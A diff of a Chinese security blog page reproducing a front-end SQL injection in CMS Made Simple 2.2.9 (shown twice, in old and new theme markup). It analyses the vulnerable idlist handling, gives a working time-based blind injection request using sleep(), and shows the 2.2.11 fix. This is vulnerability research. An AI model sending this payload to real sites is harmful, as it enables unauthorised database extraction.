@@ -1,115 +1,523 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cmsms_2.2.9前台sql注入(复现) | osword's blog</title><meta name="description" content="漏洞原理 没有对sql语句进行过滤 unset操作绕过对字符串的强制类型操作  漏洞分析class.CMS_Content_Block.php，第237行执行对传入的mact参数进行拆分 $modulename&#x3D;”news”、$action&#x3D;”default”  class.CMS_Content_Block.php第289行GetModuleParameters方法 ，解析传入的参数，注册变量，"><meta name="keywords" content="代码审计"><meta name="author" content="osword"><meta name="copyright" content="osword"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Cmsms_2.2.9前台sql注入(复现)"><meta name="twitter:description" content="漏洞原理 没有对sql语句进行过滤 unset操作绕过对字符串的强制类型操作  漏洞分析class.CMS_Content_Block.php，第237行执行对传入的mact参数进行拆分 $modulename&#x3D;”news”、$action&#x3D;”default”  class.CMS_Content_Block.php第289行GetModuleParameters方法 ，解析传入的参数，注册变量，"><meta name="twitter:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="og:type" content="article"><meta property="og:title" content="Cmsms_2.2.9前台sql注入(复现)"><meta property="og:url" content="http://zhzhdoai.github.io/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/"><meta property="og:site_name" content="osword's blog"><meta property="og:description" content="漏洞原理 没有对sql语句进行过滤 unset操作绕过对字符串的强制类型操作  漏洞分析class.CMS_Content_Block.php，第237行执行对传入的mact参数进行拆分 $modulename&#x3D;”news”、$action&#x3D;”default”  class.CMS_Content_Block.php第289行GetModuleParameters方法 ，解析传入的参数，注册变量，"><meta property="og:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="article:published_time" content="2019-09-17T12:20:28.000Z"><meta property="article:modified_time" content="2020-05-15T08:25:04.000Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
-var t = Cookies.get("theme")
-if (autoChangeMode == '1'){
-  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
-  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
-  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-  if (t === undefined){
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport){
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour < 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-  }
-  } else if (t == 'light') activateLightMode()
-  else activateDarkMode()
 
-} else if (autoChangeMode == '2'){
-  now = new Date();
-  hour = now.getHours();
-  isNight = hour < 6 || hour >= 18
-  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode() 
-} else {
-  if ( t == 'dark' ) activateDarkMode()
-  else if ( t == 'light') activateLightMode()
-}
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
 
-function activateDarkMode(){
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
-  }
-}
-function activateLightMode(){
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
-  }
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://zhzhdoai.github.io/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/"><link rel="prev" title="数字经济云安全公测大赛Inject4fun题解 " href="http://zhzhdoai.github.io/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/"><link rel="next" title="seacms&amp;#x3C;&amp;#x3D;9.92前台getshell" href="http://zhzhdoai.github.io/2019/09/11/seacms-9-92%E5%89%8D%E5%8F%B0getshell/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  bookmark: {
-    message_prev: '按',
-    message_next: '键将本页加入书签'
-  },
-  runtime_unit: '天',
-  runtime: true,
-  copyright: undefined,
-  ClickShowText: undefined,
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  highlightShrink: 'false',
-  isFontAwesomeV5: false,
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isanchor: false
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-}</script><script>var GLOBAL_CONFIG_SITE = { 
-  isPost: true,
-  isHome: false,
-  isSidebar: true  
-  }</script><noscript><style>
-#page-header {
-  opacity: 1
-}
-.justified-gallery img{
-  opacity: 1
-}
-</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">139</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">36</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞修复"><span class="toc-number">4.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/404.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">osword's blog</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">Cmsms_2.2.9前台sql注入(复现)</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2019-09-17 20:20:28"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-09-17</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-05-15 16:25:04"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-05-15</span></time></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><ol>
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>Cmsms_2.2.9前台sql注入(复现) - osword&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-09-17 20:20" pubdate>
+        2019年9月17日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      443 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      6
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">Cmsms_2.2.9前台sql注入(复现)</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><ol>
 <li>没有对sql语句进行过滤</li>
 <li>unset操作绕过对字符串的强制类型操作</li>
 </ol>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>class.CMS_Content_Block.php，第237行执行对传入的mact参数进行拆分</p>
 <p>$modulename=”news”、$action=”default”</p>
-<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723417461.png" alt="1568723417461"></p>
+<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723417461.png" srcset="/img/loading.gif" alt="1568723417461"></p>
 <p>class.CMS_Content_Block.php第289行GetModuleParameters方法 ，解析传入的参数，注册变量，并未做任何过滤，$key值在不为’id’、’returnid’将直接以字符串的形式传递到$param数组中。$param[‘idlist’]=”0,1)) and sleep(9) –”</p>
-<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723447621.png" alt="1568723447621"></p>
+<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723447621.png" srcset="/img/loading.gif" alt="1568723447621"></p>
 <p>继续跟进代码，代码进入第295行DoAtionBase方法，第1481行执行模块中的方法.</p>
 <p>将$name=’default’拼接至文件名中，第1405行include之. </p>
 <p>$filename=’’/var/www/html/cms/cmsms-2.2.9-install/modules/News/action.default.php’</p>
-<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723276614.png" alt="1568723276614"></p>
+<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723276614.png" srcset="/img/loading.gif" alt="1568723276614"></p>
 <p>action.default.php第59行漏洞触发关键点,将$idlist拼接进字符串,explode函数拆分字符串，截取关键代码进行分析</p>
 <p>for循环第一次<code>count($tmp)=2</code>，由于进入if条件语句删除了数组第一个字符。第二次判断<code>count($tmp)=1</code>,此时$i=1不满足跳出循环，第二个字符串<code>&#39;1)) and sleep(5) --&#39;</code>就不会被强制转换为数值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$idlist=<span class="string">'0,1)) and sleep(5) --'</span>;</span><br><span class="line">$tmp = explode(<span class="string">','</span>,$idlist);</span><br><span class="line">            <span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt; count($tmp); $i++ ) &#123;</span><br><span class="line">                $tmp[$i] = (int)$tmp[$i];</span><br><span class="line">                <span class="keyword">if</span>( $tmp[$i] &lt; <span class="number">1</span> ) <span class="keyword">unset</span>($tmp[$i]);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">$idlist=<span class="hljs-string">'0,1)) and sleep(5) --'</span>;
+$tmp = explode(<span class="hljs-string">','</span>,$idlist);
+            <span class="hljs-keyword">for</span>( $i = <span class="hljs-number">0</span>; $i &lt; count($tmp); $i++ ) &#123;
+                $tmp[$i] = (int)$tmp[$i];
+                <span class="hljs-keyword">if</span>( $tmp[$i] &lt; <span class="hljs-number">1</span> ) <span class="hljs-keyword">unset</span>($tmp[$i]);
+            &#125;</code></pre>
 
 
 
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>逗号、单引号被实体编码需要绕过</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mact=News,m1_,default,0&amp;m1_idlist=0,1))and(case+when+ascii((select+substr(database()+from+1+for+1))%3d99)+then+sleep(1)+else+0+end)%23</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs http">mact=News,m1_,default,0&amp;m1_idlist=0,1))and(case+when+ascii((select+substr(database()+from+1+for+1))%3d99)+then+sleep(1)+else+0+end)%23</code></pre>
 
-<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723641057.png" alt="1568723641057"></p>
+<p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723641057.png" srcset="/img/loading.gif" alt="1568723641057"></p>
 <h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>2.2.11版本对该处进行修复</p>
 <p>in_array加强了对非法字符串的判断,去掉unset操作</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($params[<span class="string">'idlist'</span>]) ) &#123;</span><br><span class="line">    $idlist = $params[<span class="string">'idlist'</span>];</span><br><span class="line">    <span class="keyword">if</span>( is_string($idlist) ) &#123;</span><br><span class="line">        $tmp = explode(<span class="string">','</span>,$idlist);</span><br><span class="line">        $idlist = [];</span><br><span class="line">        <span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt; count($tmp); $i++ ) &#123;</span><br><span class="line">            $val = (int)$tmp[$i];</span><br><span class="line">            <span class="keyword">if</span>( $val &gt; <span class="number">0</span> &amp;&amp; !in_array($val,$idlist) ) $idlist[] = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( !<span class="keyword">empty</span>($idlist) ) $query1 .= <span class="string">' (mn.news_id IN ('</span>.implode(<span class="string">','</span>,$idlist).<span class="string">')) AND '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>($params[<span class="hljs-string">'idlist'</span>]) ) &#123;
+    $idlist = $params[<span class="hljs-string">'idlist'</span>];
+    <span class="hljs-keyword">if</span>( is_string($idlist) ) &#123;
+        $tmp = explode(<span class="hljs-string">','</span>,$idlist);
+        $idlist = [];
+        <span class="hljs-keyword">for</span>( $i = <span class="hljs-number">0</span>; $i &lt; count($tmp); $i++ ) &#123;
+            $val = (int)$tmp[$i];
+            <span class="hljs-keyword">if</span>( $val &gt; <span class="hljs-number">0</span> &amp;&amp; !in_array($val,$idlist) ) $idlist[] = $val;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">if</span>( !<span class="hljs-keyword">empty</span>($idlist) ) $query1 .= <span class="hljs-string">' (mn.news_id IN ('</span>.implode(<span class="hljs-string">','</span>,$idlist).<span class="hljs-string">')) AND '</span>;
+&#125;</code></pre>
 
 
 
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">osword</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://zhzhdoai.github.io/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/">http://zhzhdoai.github.io/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://zhzhdoai.github.io" target="_blank">osword's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/404.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/"><img class="prev_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">数字经济云安全公测大赛Inject4fun题解 </div></div></a></div><div class="next-post pull_right"><a href="/2019/09/11/seacms-9-92%E5%89%8D%E5%8F%B0getshell/"><img class="next_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">seacms&amp;#x3C;&amp;#x3D;9.92前台getshell</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2019/03/08/Dedecms-cookie伪造导致任意前台用户登录/" title="Dedecms | cookie伪造导致任意前台用户登录"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-03-08</div><div class="relatedPosts_title">Dedecms | cookie伪造导致任意前台用户登录</div></div></a></div><div class="relatedPosts_item"><a href="/2019/07/28/Dedecms后台getshell漏洞集合/" title="Dedecms后台getshell漏洞集合"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-07-28</div><div class="relatedPosts_title">Dedecms后台getshell漏洞集合</div></div></a></div><div class="relatedPosts_item"><a href="/2019/12/15/Discuz-3-4后台基于文件内容的二次注入-1/" title="Discuz!<=3.4后台基于文件内容的二次注入"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-12-15</div><div class="relatedPosts_title">Discuz!<=3.4后台基于文件内容的二次注入</div></div></a></div><div class="relatedPosts_item"><a href="/2019/07/12/DiscuzML-3-x-代码注入/" title="DiscuzML 3.x 代码注入"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-07-12</div><div class="relatedPosts_title">DiscuzML 3.x 代码注入</div></div></a></div><div class="relatedPosts_item"><a href="/2019/04/25/HDwiki6-0-sql盲注/" title="HDwiki6.0_sql盲注"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-04-25</div><div class="relatedPosts_title">HDwiki6.0_sql盲注</div></div></a></div><div class="relatedPosts_item"><a href="/2019/12/14/Laravel-5-8-反序列化-一/" title="Laravel 5.8 反序列化(一)"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-12-14</div><div class="relatedPosts_title">Laravel 5.8 反序列化(一)</div></div></a></div></div><div class="clear_both"></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By osword</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script></body></html>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
